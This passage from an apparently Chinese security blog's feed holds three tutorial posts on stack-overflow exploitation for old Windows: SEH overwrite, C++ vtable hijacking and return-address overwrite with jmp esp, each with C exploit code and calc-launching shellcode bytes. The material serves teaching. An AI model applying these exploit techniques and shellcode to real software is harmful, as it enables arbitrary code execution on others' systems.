class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HackExceptionHandler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"got an exception, press Enter to kill process\n"</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">zero = <span class="number">4</span> / zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(HackExceptionHandler())</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拖入ollydbg动态调试，选择View下的SEH chain选项，就能看到当前栈中的SEH表的情况。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh2.png" alt="seh chain"></p><p>从图中能看出，0012FF18是离栈顶最近的SEH。</p><p>接着我们在调试的栈窗口看到的数据也能验证我们的想法：</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh3.png" alt="seh stack"></p><p>地址0012ff1c的位置已经被OD自动标记为了SEhandler，address-4就是它的next指针所处的位置，与SEH chain中看到的数据一样。</p><p>另外，从上图的stack布局能看出来，buf的起始地址为12FF40，最终地址为0012FF0C，局部变量zero的位置是12FF10，只要我们能够覆盖buf到12FF18，让它指向shellcode，那么在发生异常时，就会执行到恶意代码。</p><p>因此，构造shellcode如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = </span><br><span class="line">    <span class="comment">// 下面是弹出计算器的shellcode</span></span><br><span class="line"> <span class="string">"\x83\xEC\x40\x33\xDB\x53\x68\x2E\x65\x78\x65"</span></span><br><span class="line"> <span class="string">"\x68\x63\x61\x6C\x63\x8B\xC4\x53\x50\xB9\x4D"</span></span><br><span class="line"> <span class="string">"\x11\x86\x7C\x8B\xC1\xFF\xD0\x33\xDB\x53\xB8"</span></span><br><span class="line"> <span class="string">"\xA2\xCA\x81\x7C\x8B\xC0\xFF\xD0"</span></span><br><span class="line"> <span class="string">"\x90....."</span><span class="comment">//使用90填充剩下的空间</span></span><br><span class="line"> <span class="string">"\x40\xFF\x12\x00"</span> <span class="comment">// 指向buf的起始地址，这一行会覆盖掉SEH的next指针</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就是SEH的攻击方法，因为SEH本身就放在栈中，那么发生缓冲区溢出时攻击者是一定能控制SEH的next的，这也让SEH的攻击成为了栈溢出的一种经典方法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍利用SEH来实现栈溢出&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7，Windows 2000&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（二）：攻击C++的虚函数</title>
    <link href="http://imlzq.com/2018/08/09/stackoverflow_virtualmethod/"/>
    <id>http://imlzq.com/2018/08/09/stackoverflow_virtualmethod/</id>
    <published>2018-08-09T13:42:00.000Z</published>
    <updated>2018-08-27T12:15:00.096Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍利用C++的虚函数来实现栈溢出漏洞利用</p><p>OS： Windows XP SP2, Window 7</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><a id="more"></a>    <h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>说白了就是多态，跟Java中抽象接口是一个概念，只是表现形式会略有区别。</p><p><strong>定义：</strong></p><ol><li>C++的成员函数在声明时，若使用virtual修饰，就是虚函数</li><li>一个类中可能有多个虚函数</li><li>虚函数的入口地址被统一保存在虚表（Vtable）中</li><li>对象在使用虚函数时，先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用</li><li>虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</li></ol><p>E.G：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TmpClass</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        count &lt;&lt; <span class="string">"Hello virtual"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Object</th><th>虚表Vtable</th><th>虚函数 virtual function</th></tr></thead><tbody><tr><td>虚表指针 -》point to virtual function2</td><td>virtual function1</td><td>function impl 1</td></tr><tr><td>其他成员变量</td><td>virtual function2</td><td>function impl 2</td></tr></tbody></table><p>如上，TmpClass中有个虚函数test()，因此在栈中它的布局就是，一个指向vtable的虚表指针以及其他成员变量。</p><p>当程序运行时，如果要调用这个test方法，那么就会到栈中找到虚表指针，然后从虚表中匹配这个虚表指针从而定位它的函数实现。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>从上文可以看出，如果对象中的成员变量发生了溢出，那么只要我们能够修改对象的虚表指针或者虚表中的虚函数实现指针，就能让程序定向执行我们的shellcode。</p><table><thead><tr><th>栈布局</th></tr></thead><tbody><tr><td>局部变量</td></tr><tr><td>security_cookie ：      gs校验码，操作系统用于检测是否有溢出，需要操作系统支持且编译时开启</td></tr><tr><td>入栈寄存器</td></tr><tr><td>SEH节点</td></tr><tr><td>返回地址</td></tr><tr><td>函数参数</td></tr><tr><td>虚函数表</td></tr></tbody></table><p>这上面是函数调用时栈内的布局情况，从下到上为高地址到低地址。</p><p>从虚函数的执行逻辑来说，会有两个地址的跳转。</p><ol><li>从虚表指针跳转到虚表</li><li>从虚表跳转到虚函数</li></ol><p>因此，如果我们要实行攻击，那么只需要使用自定义的两段地址覆盖掉原始地址即可，其中的一个地址A是指向shellcode的首部或者末尾，这里也是地址B。地址B再指向Shellcode的真正执行代码</p><p><strong>攻击代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = </span><br><span class="line"><span class="string">"\x64\xD8\x42\x00"</span>  <span class="comment">// 地址B，目前放于Shellcode首部，用于跳转到shellcode的真正起始地址。在这里是当前位置+4。</span></span><br><span class="line"> <span class="comment">// 注意，这里的地址B是附带\x00截断符的，对攻击有影响，具体的看文末的TIP模块</span></span><br><span class="line"> <span class="comment">// 建议将地址B放在Shellcode的末尾</span></span><br><span class="line"><span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span></span><br><span class="line"><span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line"><span class="string">"\xDB\x53"</span></span><br><span class="line"><span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line"><span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line"><span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"hello world"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HelloWorld overflow, *p;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p_vtable;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, overflow.buf); <span class="comment">// 获取类中buf[200]的实际地址，虚表指针的地址为buf-4</span></span><br><span class="line">p_vtable = overflow.buf - <span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0x42E1CC</span>;          </span><br><span class="line"><span class="keyword">int</span> lx = x &amp; <span class="number">0xFF</span>;    </span><br><span class="line"><span class="keyword">int</span> mx = x &gt;&gt; <span class="number">8</span>&amp;<span class="number">0xFF</span>;    </span><br><span class="line"><span class="keyword">int</span> hx = x &gt;&gt; <span class="number">16</span>&amp;<span class="number">0xFF</span>;</span><br><span class="line"><span class="keyword">int</span> first02 = x &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, lx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, mx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, hx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, first02);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在获取到虚表指针在内存中的实际地址后,我们需要将它指向的内容改为地址B</span></span><br><span class="line">    <span class="comment">// 这样就能跳转到Shellcode的首部从而执行二次跳转</span></span><br><span class="line">p_vtable[<span class="number">0</span>] = lx;</span><br><span class="line">p_vtable[<span class="number">1</span>] = mx;</span><br><span class="line">p_vtable[<span class="number">2</span>] = hx;</span><br><span class="line">p_vtable[<span class="number">3</span>] = first02;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf, shellcode);</span><br><span class="line"></span><br><span class="line">p = &amp;overflow;</span><br><span class="line">p-&gt;test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果如下：</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_virtualmethod.png" alt="virtual"></p><p>可以看到这里就已成功弹出计算器了。</p><p>测试代码的Shellcode起始位置是\x83\xEC\x50\x33。\x64\xD8\x42\x00（也就是地址B）指向\x83\xEC\x50\x33</p><p>在《0day安全》的书籍中，它把地址B放在Shellcode的末尾，只不过那样的话地址B指向的地址就应该是 addressB - sizeof(shellcode).</p><p><strong>TIP:</strong></p><p>本文的地址B，是附带00的，也就是说在使用strcpy时复制到00就会截断，而之后到的跳转地址其实是Shellcode在内存中的地址<strong>（Shellcode并没有覆盖缓冲区）</strong>，也就是说，如果本文的input是个txt文件，那么本次的攻击就会失败。因为读到00时就已中断了，后面的shellcode根本就没有读入到内存，也就无法跳转。</p><p>在本文的示例中，之所以能成功，是因为shellcode是代码的一个局部变量，程序创建时它就已经在内存中了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍利用C++的虚函数来实现栈溢出漏洞利用&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（一）：原理及初级攻击</title>
    <link href="http://imlzq.com/2018/08/07/stackOverFlow_1/"/>
    <id>http://imlzq.com/2018/08/07/stackOverFlow_1/</id>
    <published>2018-08-07T14:13:00.000Z</published>
    <updated>2018-09-03T10:42:10.534Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行</strong></p><p>之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。</p><p>OS： Windows XP SP2, Window 7</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><p>Book: 《0day安全：软件漏洞分析技术》</p><p>知识点的主要来源是”0day安全：软件漏洞分析技术”和网络，但发现它内部80%漏洞利用代码均无法直接在自己的机器上运行。因此本通关专栏不会完全按书的内容规划，在必要的时候会自行实现</p><a id="more"></a>    <h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>每个进程都有一个独立的虚拟地址空间，这些虚拟地址空间在x86里被称为segment，例如Data Segment、Text Segment、stack、heap等等。</p><blockquote><p>Android中，进程里的虚拟地址空间是由vm_area_struct结构组成的。全局维护一个vm_area_struct链表，用于串联所有已分配的空间。当使用mmap申请一个内存空间时，就会找到进程中一块连续且符合大小的区域，创建一个vm_area_struct结构用于标识本区域块，然后将其链接到进程的vm_area_struct链表中。</p></blockquote><p>栈向上增长，底部为高字节，上部为底字节。</p><h2 id="函数调用的汇编过程"><a href="#函数调用的汇编过程" class="headerlink" title="函数调用的汇编过程"></a>函数调用的汇编过程</h2><blockquote><p>需要用到的关键词：</p><p>EBP: 栈底指针</p><p>ESP: 栈顶指针</p><p>EIP：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行</p></blockquote><p><strong>目标函数：</strong>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[] = <span class="string">"1234567"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>将目标函数需要的参数从右到左依次入栈。PUSH c, PUSH  b, PUSH a</li><li>将函数的返回地址入栈，也就是执行完这个函数后应该执行的下一条指令的地址。</li><li>跳转到目标代码块。2和3合为CALL指令。CALL address of func</li><li>调用方的栈顶属于被调用方的栈底，因此保存该信息，便于接下来分配新的栈帧供func使用。 MOV  ebp, esp,    PUSH ebp</li><li>抬高栈帧.  SUB esp, 0x40.    这也就是给函数分配内存空间，0x40是根据目标函数func的局部变量确定的（程序在链接-编译-汇编的过程中就已生成了size，解析值即可），这里只是示例。</li><li>创建局部变量，4个字节为一组。buf[8]因此会被分为两部分： buf[4~7], buf[0~3]</li><li>do something</li><li>程序执行完毕，还原调用环境，也就是各寄存器的值。降低esp，也就是释放之前分配的栈帧资源。 add esp, 0x40</li><li>程序的最后一行，是RETN，也就是返回。从CPU从EIP中取出下一条指令的内存地址然后执行，这样就完成了函数调用的回溯</li></ol><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>在上面的1~6步完成后，栈的结构应该是这样的。</p><p><strong>高地址在下，低地址在上</strong></p><table><thead><tr><th>buf[0~3]</th></tr></thead><tbody><tr><td>buf[4~7]</td></tr><tr><td>ebp</td></tr><tr><td>Return Address</td></tr><tr><td>Param a</td></tr><tr><td>Param b</td></tr><tr><td>Param c</td></tr></tbody></table><p>从函数调用的过程来说，函数执行完毕后执行的下一个指令地址就是ReturnAddress。</p><p>如果我们想让程序在执行完func后跑去执行我们自己构造的恶意代码，只需修改ReturnAddress的值即可。</p><blockquote><p>以前的流程是： main-&gt;func-&gt;main</p><p>修改func的返回值后：main-&gt;func-&gt;shellcode</p></blockquote><p>C允许开发者直接对内存中的某个地址做修改，它本身也存在内存不安全函数。常见的如：gets、strcpy、strcat、scanf等。</p><p>func使用strcpy将name中的所有内容全拷贝到buf中，如果name的内容超过buf的大小，那么接下来的内容就会覆盖掉buf下面的ebp、return address等。如果我们让name中先存放12字节的任意数据（buf占8个字节，ebp占4个字节），那么name[13~16]就会覆盖掉Return address，当func返回值EIP指向的就是name[13~16]的地址了。</p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>即恶意代码。指攻击者用于实时攻击的一段指令，指令的形式不限，不管是高级语言Java、Python，或者是汇编、机器指令，均可称作Shellcode。</p><p>本文的栈溢出，因为是直接将恶意代码插入到栈当中，在程序返回时恶意执行，没有将代码解析和转换成机器指令的流程，因此需要直接存入机器指令。</p><p>本文生成Shellcode的方法如下：</p><ol><li>编写汇编</li><li>使用UltraEdit或者AsmToE 将汇编转为机器指令</li><li>通过在机器指令码首部插入  \x 的方式将所有指令串联起来</li></ol><blockquote><p><strong>例如：</strong></p><p>机器指令为  83 EC 50，</p><p>对应的汇编为sub esp,50h</p><p>Shellcode为\x83\EC\50</p></blockquote><p><strong>TIPS：</strong></p><p>在生成Shellcode时，需要按照漏洞的类型仔细配置.</p><p>例如本文的攻击面是strcpy，而strcpy有个特性，一旦读取的字符串中包含00，就认为这个字符串的读取已经结束了。因此我们本次的Shellcode一定不能出现00的机器码。对于memcpy命令来说，就不存在这个问题</p><h3 id="Shellcode的加载与调试"><a href="#Shellcode的加载与调试" class="headerlink" title="Shellcode的加载与调试"></a>Shellcode的加载与调试</h3><p>Shellcode最常见的形式是把字符转换为机器码并存储在一个字符数组中，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\x41\x41\x41\x41\x41\x41\x41\x41"</span>  <span class="comment">// name[0]~name[7]</span></span><br><span class="line">     <span class="string">"\x41\x41\x41\x41"</span>                      <span class="comment">// to Overlap EBP</span></span><br><span class="line">     <span class="string">"\xed\x1e\x96\x7c"</span>                        <span class="comment">// Return Address(Address of "Jmp eax")</span></span><br><span class="line"><span class="comment">// 下面是Shellcode，用于执行弹出计算器的代码</span></span><br><span class="line"> <span class="string">"\x83\xEC\x40\x33\xDB\x53\x68\x2E\x65\x78\x65"</span></span><br><span class="line"> <span class="string">"\x68\x63\x61\x6C\x63\x8B\xC4\x53\x50\xB9\x4D"</span></span><br><span class="line"> <span class="string">"\x11\x86\x7C\x8B\xC1\xFF\xD0\x33\xDB\x53\xB8"</span></span><br><span class="line"> <span class="string">"\xA2\xCA\x81\x7C\x8B\xC0\xFF\xD0"</span>;</span><br></pre></td></tr></table></figure><p>直接将Shellcode填入漏洞程序的缓冲区去调试一般是不可取的，因为我们需要确认程序出错是因为Shellcode本身的问题还是因为Shellcode覆盖了程序的某些核心值导致运行出错，这就要我们动态调试了。所以一般编写和调试Shellcode会用如下的方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[] = '16进制机器码';</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lea会将shellcode的地址存入到Eax中，ret指令会把push进去的shellcode地址弹给Eip,让处理器跳转到栈区去执行shellcode，从而实现调用</p><blockquote><p>上面这段代码也等同于  eip = shellcode, call/jmp eip</p></blockquote><h2 id="一、攻击：指定Shellcode的地址"><a href="#一、攻击：指定Shellcode的地址" class="headerlink" title="一、攻击：指定Shellcode的地址"></a>一、攻击：指定Shellcode的地址</h2><p>上文说到，将func的ReturnAddress替换为Shellcode在内存中的地址即可正确执行代码。那如何获取Shellcod在内存中的地址呢？</p><p><strong>分两种情况：</strong></p><ol><li>只考虑本地环境</li><li>通用环境。即所有的windows都能跳转到Shellcode的首地址。</li></ol><p>先分析我们的攻击代码，它由两部分构成。</p><p>一部分是覆盖代码A，用于覆盖buf的所有空间以及EBP（这一块其实并不算Shellcode）</p><p>另一部分就是Shellcode，它的首部地址就是我们的目标。</p><p>A可以完全或部分包含Shellcode，也可以将shellcode排列在A之后。</p><p>获取Shellcode的地址有两个方法，一个是直接打印，一个是使用调试工具ida pro、ollydbg动态调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shellcode在A之后</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, size of buf + <span class="number">4</span>); <span class="comment">// 最后的加4是EBP的4个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode在A之间</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, name + shellcode相对于A头部的偏移);</span><br></pre></td></tr></table></figure><p>因为只考虑本地环境这种攻击方法兼容性太差，因此代码就不贴上来了，直接介绍下面的第二种攻击方式。jmp esp</p><h2 id="二、攻击：JMP-esp"><a href="#二、攻击：JMP-esp" class="headerlink" title="二、攻击：JMP esp"></a>二、攻击：JMP esp</h2><table><thead><tr><th>函数返回时栈中的情况</th></tr></thead><tbody><tr><td>Return Address</td></tr><tr><td>Param a</td></tr><tr><td>Param b</td></tr></tbody></table><p>当我们使用ollydbg调试函数返回的情况，栈内的情况如上图。之前已经分配的buf和ebp已被弹出。只剩返回值地址，函数的入参a、b、c</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return.png" alt="指向RETN"></p><p>此时，函数还未返回，ESP指向0013FF84，也就是返回后程序会从13FF84取出地址7C961EED并跳转 .</p><p>而当我们手动点击下一步，程序跳转到了地址7C961EED，但此时esp的值也变为了0013FF88。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return_end.png" alt="下一步"></p><p><strong>这说明什么呢？</strong></p><p>说明不管程序如何返回，在执行完RETN后ESP一定会指向ReturnAddress的下一个地址。本文也就是指向Param a的地址。我们可以先让Shellcode从Param a的位置开始填充，再让ReturnAddress跳转的地址指向一个jmp esp命令，那么此时再点击单步执行，那么程序就会从ESP所指向的地址中取值并执行，这样也就跳转到我们的Shellcode了</p><p>因此整体的攻击流程就可以变更为：</p><ol><li>任意非00的指令覆盖buffer和EBP</li><li>从程序已经加载的dll中获取他们的jmp esp指令地址。</li><li>使用jmp esp的指令地址覆盖ReturnAddress</li><li>从下一行开始填充Shellcode</li></ol><p>获取jmp esp地址的方法为：</p><blockquote><ul><li><p>打开windbg，File-&gt;attach a process. </p></li><li><p>lm 指令查看现在加载了哪些库，获取它的start地址和end地址。对于win32程序而言，他们都会加载kernel32.dll和ntdll.dll</p></li><li><p>jmp esp的机器码为 FF E4。 使用指令：  s start地址 end地址 FF E4   即可查看库中包含jmp esp的地址address。</p></li><li>u address 指令可以查看该地址处的汇编，检验是否是jmp esp</li><li>校验无误后保存备用</li></ul></blockquote><p>获取jmp esp后，我们需要用16进制表示它。这里有个小tips，因为windows操作系统是小端显示，那么对应的16进制就应该反着写。</p><p>例如，我们通过windbg获得的jmp esp地址为7c961eed，那么它的16进制就是0xed1e967c，即两位一组，反着写。</p><p><strong>编写Shellcode</strong></p><p>接下来，我们就可以开始编写Shellcode。编写Shellcode有多种方式，最快捷的是使用metasploit直接生成payload。本文用弹出一个计算器作为示例。</p><p>在C中，如果我们要弹出一个计算器，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LoadLibrary(<span 